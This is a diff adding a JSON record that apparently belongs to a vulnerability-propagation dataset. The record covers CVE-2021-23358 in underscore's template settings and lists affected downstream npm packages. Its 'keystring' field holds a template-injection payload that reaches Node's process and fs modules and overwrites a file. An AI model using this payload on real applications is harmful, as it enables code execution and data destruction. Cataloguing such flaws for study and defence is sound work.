@@ -1,0 +1,16 @@
+{
+  "id": "CVE-2021-23358",
+  "upstream": "underscore@1.1.5",
+  "keymethod": "templateSettings.variable",
+  "keystring": "a = this.constructor.constructor(`return process`)().mainModule.require(`fs`).writeFileSync(`underscore`,``)",
+  "location": "modules/template.js:71:14",
+  "downstreams": [
+    "node-lumberjack@0.0.4",
+    "sequelize@1.1.4",
+    "bones@1.0.0",
+    "coffee-echonest@0.0.1",
+    "backbone-stash@0.0.4",
+    "sqlize@0.1.0",
+    "amazon-ses@0.0.1"
+  ]
+}
